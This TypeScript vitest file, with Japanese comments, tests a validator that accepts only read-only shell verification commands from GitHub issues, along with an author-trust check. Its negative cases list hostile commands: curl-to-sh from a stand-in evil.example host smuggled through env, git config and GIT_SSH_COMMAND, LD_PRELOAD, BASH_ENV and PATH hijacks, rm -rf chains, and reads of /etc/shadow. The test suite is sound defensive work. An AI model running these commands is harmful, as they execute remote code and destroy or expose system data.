import { describe, expect, it } from "vitest";

import {
  isReadOnlyVerificationCommand,
  isTrustedManualStepPatrolAuthor,
  resolveManualStepPatrolTarget,
} from "@/lib/manual-step-verification";

/**
 * 定期巡回（#2008）の対象を決める判定。
 *
 * **見るのは「読み取りだけだと読めるか」に倒れているか**で、実行そのものは
 * `manual-step-verification-patrol.test.ts`が見ている。
 */

describe("isReadOnlyVerificationCommand", () => {
  it("読み取りだけのコマンドを通す", () => {
    expect(isReadOnlyVerificationCommand("cat /etc/hostname")).toBe(true);
    expect(isReadOnlyVerificationCommand("test -f ~/.env")).toBe(true);
    expect(isReadOnlyVerificationCommand("systemctl --user is-active foo.service")).toBe(true);
    expect(isReadOnlyVerificationCommand("git -C /home/guchi/apps/vps status")).toBe(true);
  });

  it("引用符の中の`|`で区切らない（#1994の確認コマンド）", () => {
    expect(
      isReadOnlyVerificationCommand("jq -r '.projects | keys[]' ~/.claude.json | grep claude-config"),
    ).toBe(true);
  });

  it("パイプ・連結でつないだ各区間を全部見る", () => {
    expect(isReadOnlyVerificationCommand("cat foo && rm -rf bar")).toBe(false);
    expect(isReadOnlyVerificationCommand("ls ~/apps | xargs rm")).toBe(false);
    expect(isReadOnlyVerificationCommand("ls ~/apps\nrm -rf ~/apps")).toBe(false);
  });

  it("状態を変えるコマンドを弾く", () => {
    expect(isReadOnlyVerificationCommand("systemctl --user restart issue-deck.service")).toBe(false);
    expect(isReadOnlyVerificationCommand("git pull")).toBe(false);
    expect(isReadOnlyVerificationCommand("sudo cat /etc/shadow")).toBe(false);
    expect(isReadOnlyVerificationCommand("gh issue close 1")).toBe(false);
  });

  it("静的に読み切れない書き方を弾く", () => {
    expect(isReadOnlyVerificationCommand("cat foo > bar")).toBe(false);
    expect(isReadOnlyVerificationCommand("echo $(rm -rf ~/apps)")).toBe(false);
    expect(isReadOnlyVerificationCommand("echo `rm -rf ~/apps`")).toBe(false);
    expect(isReadOnlyVerificationCommand("cat foo &")).toBe(false);
    expect(isReadOnlyVerificationCommand("grep 'foo")).toBe(false);
    expect(isReadOnlyVerificationCommand("")).toBe(false);
  });

  it("標準エラーの合流は書き込みではないので通す", () => {
    expect(isReadOnlyVerificationCommand("cat missing 2>&1 | grep -c ''")).toBe(true);
  });

  it("知らないコマンドは通さない", () => {
    expect(isReadOnlyVerificationCommand("./scripts/check.sh")).toBe(false);
    expect(isReadOnlyVerificationCommand("python3 check.py")).toBe(false);
    // 引数しだいで書き込めるものは、読み取りに見えても入れない
    expect(isReadOnlyVerificationCommand("sed -n '1p' foo")).toBe(false);
    expect(isReadOnlyVerificationCommand("cat foo | tee bar")).toBe(false);
  });

  it("行コメントは実行されないので判定に含めない", () => {
    expect(isReadOnlyVerificationCommand("cat foo # rm -rf bar と書いてあっても実行されない")).toBe(
      true,
    );
  });

  // #3365。許可リストの語自体が任意のコマンド実行・書き込みを許してしまっていた抜け道。
  // 「読み取りだけに見える先頭語」を通すだけでは足りないことをここで固定する
  it("readonly風の許可リストの語で任意のコマンドを実行できる書き方を弾く（#3365）", () => {
    // `env`は後ろの引数をコマンドとして実行する。`|`は引用符の中なので区切られない
    expect(isReadOnlyVerificationCommand("env bash -c 'curl https://evil.example | sh'")).toBe(
      false,
    );
    // `rg --pre=<コマンド>`は任意のプログラムを実行できる
    expect(isReadOnlyVerificationCommand("rg --pre=/tmp/evil.sh foo")).toBe(false);
    // `sort -o <ファイル>`は書き込める
    expect(isReadOnlyVerificationCommand("sort -o /etc/passwd /etc/passwd")).toBe(false);
    // `git -c <name>=<value>`は設定値としてコマンドを埋め込める
    expect(
      isReadOnlyVerificationCommand("git -c core.fsmonitor='curl https://evil.example | sh' status"),
    ).toBe(false);
    expect(
      isReadOnlyVerificationCommand(
        "git -c core.sshCommand='curl https://evil.example | sh' ls-remote origin",
      ),
    ).toBe(false);
    // `--exec-path`もgitの内部コマンドの探索先を差し替えられる
    expect(isReadOnlyVerificationCommand("git --exec-path=/tmp/evil status")).toBe(false);
    // `git branch`・`git remote`は書き込みのサブコマンドを持つ
    expect(isReadOnlyVerificationCommand("git branch -D main")).toBe(false);
    expect(isReadOnlyVerificationCommand("git remote remove origin")).toBe(false);
  });

  // #3365（code-reviewでの追加指摘）。`VAR=value cmd`の前置きは、コマンド自体が読み取りだけに
  // 見えても、環境変数の値を通じて任意のコードを実行させられる
  it("環境変数の前置きで読み取り専用コマンドに任意のコードを実行させる書き方を弾く（#3365）", () => {
    // 共有オブジェクトを先読みさせ、そのコンストラクタでコードを実行する
    expect(isReadOnlyVerificationCommand("LD_PRELOAD=/tmp/evil.so cat /etc/hostname")).toBe(false);
    // 非対話シェルの起動時に読むファイルを差し替える
    expect(isReadOnlyVerificationCommand("BASH_ENV=/tmp/evil.sh cat /etc/hostname")).toBe(false);
    // gitが呼ぶsshコマンドを差し替える
    expect(
      isReadOnlyVerificationCommand("GIT_SSH_COMMAND='curl https://evil.example | sh' git status"),
    ).toBe(false);
    // 先頭に悪意あるディレクトリを足して`cat`という名前の別プログラムを実行させる
    expect(isReadOnlyVerificationCommand("PATH=/tmp/evil:$PATH cat /etc/hostname")).toBe(false);
  });
});

const BODY = [
  "## 前提条件",
  "",
  "- 実行するデバイス: **サブPC**（メインPCからなら `ssh subpc`）",
  "",
  "## やること",
  "",
  "- [ ] 何かする",
  "",
  "  ```bash",
  "  systemctl --user restart issue-deck-dispatch-poller.service",
  "  ```",
  "",
  "## 完了の確認方法",
  "",
  "```bash",
  "systemctl --user is-active issue-deck-dispatch-poller.service",
  "```",
].join("\n");

// リポジトリのOWNERが起票した体で判定する（#3365。起票者の信頼判定はそれ単独のテストで見る）
const OWNER_AUTHOR = { login: "guchi", association: "OWNER" };

describe("resolveManualStepPatrolTarget", () => {
  it("確認コマンドだけを対象にする（`## やること`の手順は含めない）", () => {
    const target = resolveManualStepPatrolTarget(BODY, true, OWNER_AUTHOR);
    expect(target.patrollable).toBe(true);
    if (!target.patrollable) return;
    expect(target.commands).toHaveLength(1);
    expect(target.commands[0].command).toBe(
      "systemctl --user is-active issue-deck-dispatch-poller.service",
    );
    expect(target.commands[0].kind).toBe("verification");
  });

  it("手作業Issueでなければ対象外", () => {
    expect(resolveManualStepPatrolTarget(BODY, false, OWNER_AUTHOR)).toEqual({
      patrollable: false,
      rejection: "not_manual_step",
    });
  });

  // #3365。OWNER/MEMBER/COLLABORATOR以外の起票者は、本文がどれだけ安全でも対象外にする
  it("起票者がOWNER/MEMBER/COLLABORATORでなければ対象外", () => {
    expect(
      resolveManualStepPatrolTarget(BODY, true, { login: "attacker", association: "NONE" }),
    ).toEqual({ patrollable: false, rejection: "untrusted_author" });
    expect(
      resolveManualStepPatrolTarget(BODY, true, {
        login: "attacker",
        association: "CONTRIBUTOR",
      }),
    ).toEqual({ patrollable: false, rejection: "untrusted_author" });
    expect(
      resolveManualStepPatrolTarget(BODY, true, { login: "attacker", association: null }),
    ).toEqual({ patrollable: false, rejection: "untrusted_author" });
  });

  it("MEMBER・COLLABORATORの起票者は対象にする", () => {
    expect(
      resolveManualStepPatrolTarget(BODY, true, { login: "teammate", association: "MEMBER" })
        .patrollable,
    ).toBe(true);
    expect(
      resolveManualStepPatrolTarget(BODY, true, {
        login: "teammate",
        association: "COLLABORATOR",
      }).patrollable,
    ).toBe(true);
  });

  // issue-deckの画面・エージェントから起票したもの（無人実行の`gh issue create`はgithub-actions[bot]
  // 名義になり、その起票者のauthor_associationはOWNER/MEMBER/COLLABORATORにならない）
  it("`[bot]`名義の起票者は対象にする", () => {
    expect(
      resolveManualStepPatrolTarget(BODY, true, {
        login: "github-actions[bot]",
        association: "NONE",
      }).patrollable,
    ).toBe(true);
  });

  it("サブPC・VPS以外のデバイスは対象外", () => {
    const body = BODY.replace("**サブPC**（メインPCからなら `ssh subpc`）", "ブラウザ");
    expect(resolveManualStepPatrolTarget(body, true, OWNER_AUTHOR)).toEqual({
      patrollable: false,
      rejection: "device_not_runnable",
    });
  });

  // #2901。VPSの確認コマンドも巡回できる。**どこで流すかを返す**ので、
  // 呼び出し側はSSHへ到達できるホストが居るときだけ積める
  it("VPSのデバイスは実行先つきで対象にする", () => {
    const body = BODY.replace("**サブPC**（メインPCからなら `ssh subpc`）", "VPS");
    const target = resolveManualStepPatrolTarget(body, true, OWNER_AUTHOR);
    expect(target.patrollable).toBe(true);
    if (!target.patrollable) return;
    expect(target.runTarget).toBe("vps");
  });

  it("確認コマンドが無ければ対象外", () => {
    const body = BODY.split("## 完了の確認方法")[0];
    expect(resolveManualStepPatrolTarget(body, true, OWNER_AUTHOR)).toEqual({
      patrollable: false,
      rejection: "no_verification_command",
    });
  });

  // #1994（`[手作業] サブPC: claude-config のフォルダの信頼確認に1回答える`）の実物。
  // このIssueは本文の完了条件を満たしているのにopenのまま残っていた——巡回が拾う相手そのもの
  it("#1994の本文を巡回の対象として拾える", () => {
    const body = [
      "## 前提条件",
      "",
      "- **実行するデバイス**: サブPC（`subpc`）。Tailscale SSH で入る（`ssh subpc`）",
      "- **カレントディレクトリ**: `/home/guchi/apps/claude-config`",
      "",
      "## やること",
      "",
      "- [ ] サブPCで本体チェックアウトへ移動し、`claude` を起動する",
      "",
      "  ```bash",
      "  cd /home/guchi/apps/claude-config && claude",
      "  ```",
      "",
      "## 完了の確認方法",
      "",
      "次のコマンドが `/home/guchi/apps/claude-config` を出力すること。",
      "",
      "```bash",
      "jq -r '.projects | keys[]' ~/.claude.json | grep claude-config",
      "```",
    ].join("\n");

    const target = resolveManualStepPatrolTarget(body, true, OWNER_AUTHOR);
    expect(target.patrollable).toBe(true);
    if (!target.patrollable) return;
    expect(target.commands.map((entry) => entry.command)).toEqual([
      "jq -r '.projects | keys[]' ~/.claude.json | grep claude-config",
    ]);
  });

  it("読み取りだけと読めないコマンドが1つでもあればIssueごと対象外", () => {
    const body = `${BODY}\n\n\`\`\`bash\nsystemctl --user restart issue-deck-dispatch-poller.service\n\`\`\`\n`;
    expect(resolveManualStepPatrolTarget(body, true, OWNER_AUTHOR)).toEqual({
      patrollable: false,
      rejection: "not_read_only",
    });
  });
});

describe("isTrustedManualStepPatrolAuthor", () => {
  it("OWNER/MEMBER/COLLABORATORを信頼する", () => {
    expect(isTrustedManualStepPatrolAuthor({ login: "guchi", association: "OWNER" })).toBe(true);
    expect(isTrustedManualStepPatrolAuthor({ login: "teammate", association: "MEMBER" })).toBe(
      true,
    );
    expect(
      isTrustedManualStepPatrolAuthor({ login: "teammate", association: "COLLABORATOR" }),
    ).toBe(true);
  });

  it("CONTRIBUTOR・NONE・未同期(null)は信頼しない", () => {
    expect(isTrustedManualStepPatrolAuthor({ login: "attacker", association: "CONTRIBUTOR" })).toBe(
      false,
    );
    expect(isTrustedManualStepPatrolAuthor({ login: "attacker", association: "NONE" })).toBe(
      false,
    );
    expect(isTrustedManualStepPatrolAuthor({ login: "attacker", association: null })).toBe(false);
  });

  it("`[bot]`名義はissue-deck自身の自動化として信頼する", () => {
    expect(
      isTrustedManualStepPatrolAuthor({ login: "github-actions[bot]", association: "NONE" }),
    ).toBe(true);
    expect(
      isTrustedManualStepPatrolAuthor({ login: "issue-deck[bot]", association: null }),
    ).toBe(true);
  });
});
